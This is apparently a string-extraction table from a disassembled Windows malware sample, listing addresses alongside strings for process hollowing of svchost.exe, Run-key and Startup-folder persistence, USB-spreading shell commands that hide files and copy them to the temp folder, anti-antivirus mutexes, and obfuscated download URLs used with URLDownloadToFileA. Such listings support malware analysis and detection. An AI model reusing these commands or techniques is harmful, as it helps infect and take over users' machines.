reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40367c	0x4013c4	string	0x403670	dwwin.exe
0x4036b1	0x4013d0	string	0x4036a0	protectaavprotector_c000900
0x4036fb	0x4013ec	string	0x4036f0	IsWow64Process
0x403700	0x4013fc	string	0x4036f0	kernel32.dll
0x40371f	0x40140c	string	0x4036f0	AAVkillllerrrsdadc000900
0x4038d9	0x40142c	string	0x403820	.exe
0x403b66	0x401438	string	0x403b60	iphlpapi.dll
0x403b74	0x401448	string	0x403b60	GetExtendedTcpTable
0x403b86	0x40145c	string	0x403b60	GetOwnerModuleFromTcpEntry
0x403f7c	0x401508	string	0x403f50	{A5DCBF10-6530-11D2-901F-00C04FB951ED}
0x4040dd	0x401558	string	0x4040d0	abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
0x404190	0x401594	string	0x404140	CoInitializeEx
0x404195	0x4015a4	string	0x404140	ole32.dll
0x40422b	0x4015b0	string	0x404140	/c "%%SystemRoot%%\explorer.exe %%cd%%%s & attrib -s -h %%cd%%%s & xcopy /F /S /Q /H /R /Y %%cd%%%s %%temp%%\%s\ & attrib +s +h %%cd%%%s & start %%temp%%\%s\%s & exit"
0x40425e	0x401658	string	0x404140	/c "start %%cd%%%s & attrib -s -h %%cd%%%s & xcopy /F /S /Q /H /R /Y %%cd%%%s %%temp%%\%s\ & attrib +s +h %%cd%%%s & start %%temp%%\%s\%s & exit"
0x404273	0x4016ec	string	0x404140	%ALLUSERSPROFILE%\..\..\windows\system32\cmd.exe
0x4042a5	0x401720	string	0x404140	%SystemRoot%\system32\SHELL32.dll
0x4042bc	0x401744	string	0x404140	%SystemRoot%\system32\SHELL32.dll
0x404354	0x40105c	string	0x404140	\?fv
0x404380	0x401768	string	0x404370	BCDEFGHIJKLMNOPQRSTUVWXYZ
0x404394	0x401784	string	0x404370	abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
0x4043ea	0x4017bc	string	0x404370	%s\c731200
0x4044cc	0x4017c8	string	0x404370	%s\c731200
0x4045a5	0x4017d4	string	0x404370	.exe
0x4045be	0x4017dc	string	0x404370	%s\*
0x404747	0x4017e4	string	0x404370	%s\%s
0x40476a	0x4017ec	string	0x404370	%s\%s
0x4047b3	0x4017f4	string	0x404370	%s\%s.lnk
0x4047d6	0x401800	string	0x404370	%s\%s
0x4047eb	0x401808	string	0x404370	.lnk
0x40482a	0x401810	string	0x404370	.exe
0x404840	0x401818	string	0x404370	.pif
0x404856	0x401820	string	0x404370	.scr
0x40486c	0x401828	string	0x404370	.cmd
0x404882	0x401830	string	0x404370	.com
0x4049bb	0x401838	string	0x404370	%s\%s
0x404cf1	0x404cfd	string	0x404ce0	jjjj
0x404d1a	0x401840	string	0x404ce0	abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890123456789
0x404daf	0x40188c	string	0x404d90	HOMEDRIVE
0x404dba	0x401898	string	0x404d90	\Program Files\
0x404ffa	0x4018b0	string	0x404fb0	IsWow64Process
0x404fff	0x4018c0	string	0x404fb0	kernel32.dll
0x405016	0x4018d0	string	0x404fb0	-aav_start
0x405036	0x4018dc	string	0x404fb0	-shell
0x405058	0x4018e4	string	0x404fb0	Windows_Shared_Mutex_231_c000900
0x405090	0x401908	string	0x404fb0	CFlagc000900
0x40516d	0x401918	string	0x404fb0	\mspaint.exe
0x40517d	0x401934	string	0x404fb0	SVCHOST_MUTEX_OBJECT_RELEASED_c000900
0x40518d	0x40195c	string	0x404fb0	kernel32.dll
0x40519b	0x40196c	string	0x404fb0	CreateProcessW
0x4051af	0x40197c	string	0x404fb0	GetProcessVersion
0x4051c3	0x401990	string	0x404fb0	Sleep
0x4051d7	0x401998	string	0x404fb0	CreateMutexA
0x4051eb	0x4019a8	string	0x404fb0	ExitProcess
0x4051ff	0x4019b4	string	0x404fb0	SetLastError
0x405213	0x4019c4	string	0x404fb0	GetLastError
0x405284	0x4019d4	string	0x404fb0	\svchost.exe
0x405415	0x4019f4	string	0x4053a0	NtUnmapViewOfSection
0x40541a	0x401a0c	string	0x4053a0	ntdll.dll
0x4055e1	0x401a18	string	0x405590	%s\c731200
0x405694	0x401a24	string	0x405660	\ScreenSaverPro.scr
0x4056f0	0x401a38	string	0x405660	\temp.bin
0x40578b	0x401a44	string	0x405730	user32.dll
0x405796	0x401a50	string	0x405730	advapi32.dll
0x4057a1	0x401a60	string	0x405730	shell32.dll
0x4057ac	0x401a6c	string	0x405730	urlmon.dll
0x4057b7	0x401a78	string	0x405730	wininet.dll
0x4057c2	0x401a84	string	0x405730	gdi32.dll
0x4057cd	0x401a90	string	0x405730	rpcrt4.dll
0x4057d8	0x401a9c	string	0x405730	netapi32.dll
0x405813	0x401aac	string	0x405730	USBProc
0x40586b	0x401ab8	string	0x405730	USBProc
0x405c41	0x401ac0	string	0x405c20	*.exe
0x405cb6	0x401ac8	string	0x405c20	.gonewiththewings
0x405d20	0x401adc	string	0x405d10	*.gonewiththewings
0x405f14	0x401af4	string	0x405ed0	\Microsoft
0x405fe2	0x401b00	string	0x405ed0	%s\Program Files\Common Files
0x405ff7	0x401b20	string	0x405ed0	\CreativeAudio
0x4060e3	0x401b34	string	0x405ed0	%s\programdata
0x4060f8	0x401b44	string	0x405ed0	\CreativeAudio
0x406208	0x401b58	string	0x405ed0	\Identities
0x40638a	0x401b64	string	0x405ed0	\adobe
0x4063df	0x401b6c	string	0x405ed0	ALLUSERSPROFILE
0x40702b	0x401b7c	string	0x407020	kernel32.dll
0x40704b	0x401b8c	string	0x407020	abcdefghijklmnopqrstuvwxyz0123456789
0x40706c	0x401bb4	string	0x407020	SSLOADasdasc000900
0x4070e6	0x401bc8	string	0x407020	CloseHandle
0x4070fe	0x401bd4	string	0x407020	CreateFileA
0x407116	0x401be0	string	0x407020	DeleteFileA
0x40712e	0x401bec	string	0x407020	ExitProcess
0x407146	0x401bf8	string	0x407020	GetFileSize
0x40715e	0x401c04	string	0x407020	GetProcAddress
0x407176	0x401c14	string	0x407020	GetSystemTime
0x40718e	0x401c24	string	0x407020	GetTempPathA
0x4071a6	0x401c34	string	0x407020	LoadLibraryA
0x4071be	0x401c44	string	0x407020	lstrcatA
0x4071d6	0x401c50	string	0x407020	lstrlenA
0x4071ee	0x401c5c	string	0x407020	ReadFile
0x407206	0x401c68	string	0x407020	SetFileAttributesA
0x40721e	0x401c7c	string	0x407020	WinExec
0x407236	0x401c84	string	0x407020	WriteFile
0x40724e	0x401c90	string	0x407020	Sleep
0x407266	0x401c98	string	0x407020	GetLastError
0x40727e	0x401ca8	string	0x407020	CreateMutexA
0x4072a8	0x401cb8	string	0x407020	c731200
0x4072de	0x401cc4	string	0x407020	user32.dll
0x4072f0	0x401cd0	string	0x407020	urlmon.dll
0x407302	0x401cdc	string	0x407020	wsprintfA
0x407314	0x401ce8	string	0x407020	URLDownloadToFileA
0x407326	0x401cfc	string	0x407020	wininet.dll
0x407338	0x401d08	string	0x407020	InternetCheckConnectionA
0x40734a	0x401d24	string	0x407020	http://www.google.com
0x4073e7	0x401d3c	string	0x407020	.exe
0x407419	0x401d44	string	0x407020	c731200
0x40742b	0x401d4c	string	0x407020	9EEAi^^2A:`]H:A>2?:2]4@>]H:A>D4]CF^2A:`]8:7
0x40743d	0x401d78	string	0x407020	9EEAi^^2A:a]H:A>2?:2]4@>]H:A>D4]CF^2A:a]8:7
0x40744f	0x401da4	string	0x407020	9EEAi^^2A:b]H:A>2?:2]4@>]H:A>D4]CF^2A:b]8:7
0x407461	0x401dd0	string	0x407020	9EEAi^^2A:c]H:A>2?:2]4@>]H:A>D4]CF^2A:c]8:7
0x407473	0x401dfc	string	0x407020	9EEAi^^2A:d]H:A>2?:2]4@>]H:A>D4]CF^2A:d]8:7
0x407485	0x401e28	string	0x407020	9EEAi^^2A:e]H:A>2?:2]4@>]H:A>D4]CF^2A:e]8:7
0x407497	0x401e54	string	0x407020	9EEAi^^2A:f]H:A>2?:2]4@>]H:A>D4]CF^2A:f]8:7
0x4074a9	0x401e80	string	0x407020	9EEAi^^2A:g]H:A>2?:2]4@>]H:A>D4]CF^2A:g]8:7
0x4074bb	0x401eac	string	0x407020	9EEAi^^2A:h]H:A>2?:2]4@>]H:A>D4]CF^2A:h]8:7
0x4074cd	0x401ed8	string	0x407020	9EEAi^^2A:]H:A>2?:2]4@>]7@H5]CF^2A:]8:7
0x4074df	0x401f00	string	0x407020	9EEAi^^2A:]H:A>2?:2]4@>]D6=7>8]CF^2A:]8:7
0x4074f1	0x401f2c	string	0x407020	9EEAi^^2A:]H:A>2?:2]4@>]=@EFDd]CF^2A:]8:7
0x407503	0x401f58	string	0x407020	9EEAi^^2A:]H:A>2?:2]4@>]H:A>2?:2]CF^{<HpIs]8:7
0x407515	0x401f88	string	0x407020	9EEAi^^2A:]H:A>2?:2]4@>]=@EJD]CF^Gy@yp:]8:7
0x407527	0x401fb4	string	0x407020	9EEAi^^2A:]H:A>2?:2]4@>]3H2ED]CF^~7;%|6]8:7
0x407539	0x401fe0	string	0x407020	9EEAi^^2A:]H:A>2?:2]4@>]DE4FD]CF^2A$!9G]8:7
0x40754b	0x40200c	string	0x407020	9EEAi^^2A:]H:A>2?:2]4@>]4>@6?]CF^K<>4w|]8:7
0x40755d	0x402038	string	0x407020	9EEAi^^2A:]H:A>2?:2]4@>]2CE34@?b]CF^7C7{6r]8:7
0x40756f	0x402068	string	0x407020	9EEAi^^2A:]H:A>2?:2]4@>]J6=@E@]CF^KHu|Hs]8:7
0x407581	0x402098	string	0x407020	9EEAi^^FA52E6]H:A>2?:2]4@>]C2F=9@DE]CF^=@8@]8:7
0x4075d6	0x4020c8	string	0x407020	\calc.exe
0x407886	0x4020d4	string	0x407810	APPDATA
0x407891	0x4020dc	string	0x407810	\Update
0x4078b2	0x4020e4	string	0x407810	\Explorer.exe
0x40791b	0x4020f4	string	0x407810	SOFTWARE\Microsoft\Windows\CurrentVersion\Run
0x40798c	0x402124	string	0x407810	Windows Explorer Manager
0x4079b3	0x402140	string	0x407810	SVCHOST_MUTEX_OBJECT_RELEASED_c000900
0x4079ee	0x402168	string	0x407810	notepad.exe
0x4079fb	0x402174	string	0x407810	msiexec.exe
0x407a08	0x402180	string	0x407810	mspaint.exe
0x407a76	0x40218c	string	0x407810	\mspaint.exe
0x407b26	0x40219c	string	0x407b10	MonitorPaint_MUTEX_OBJECT_RELEASED_c000900
0x407bb8	0x4021c8	string	0x407b10	\mspaint.exe
0x407c73	0x4021d8	string	0x407c60	MonitorSvchost_MUTEX_OBJECT_RELEASED_c000900
0x407cfc	0x402208	string	0x407c60	\svchost.exe
0x407e4f	0x402374	string	0x407dd0	WindowsSecondaryDesktop
0x407e87	0x4023a4	string	0x407dd0	\charmap.exe
0x407ee2	0x4023c0	string	0x407dd0	\Windows Media Player\wmprph.exe
0x407f55	0x402404	string	0x407f40	C:\log.txt
0x407f82	0x402410	string	0x407f40	C:\log.txt
0x408033	0x402428	string	0x408020	%s\*.*
0x408132	0x402430	string	0x408020	%s\%s
0x4081c8	0x402438	string	0x408180	%s\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
0x4081e3	0x402478	string	0x408180	%s\Documents and Settings\All users\Start Menu\Programs\Startup
0x4086a2	0x4024cc	string	0x408520	\Update
0x408766	0x4024d4	string	0x408520	Software\Microsoft\Windows\CurrentVersion\Run
0x40877a	0x402504	string	0x408520	Software\Microsoft\Windows\CurrentVersion\RunOnce
0x40878e	0x402538	string	0x408520	Software\Microsoft\Windows\CurrentVersion\Run
0x4087a2	0x402568	string	0x408520	Software\Microsoft\Windows\CurrentVersion\RunOnce
0x4088ca	0x40259c	string	0x4088a0	%s\Recycler
0x408905	0x4025a8	string	0x4088a0	%s\%s
0x408a31	0x4025b0	string	0x4089d0	%s\*.*
0x408b5c	0x4025b8	string	0x4089d0	%s\%s
0x408b7f	0x4025c0	string	0x4089d0	%s\%s
0x409099	0x402658	string	0x409060	IsWow64Process
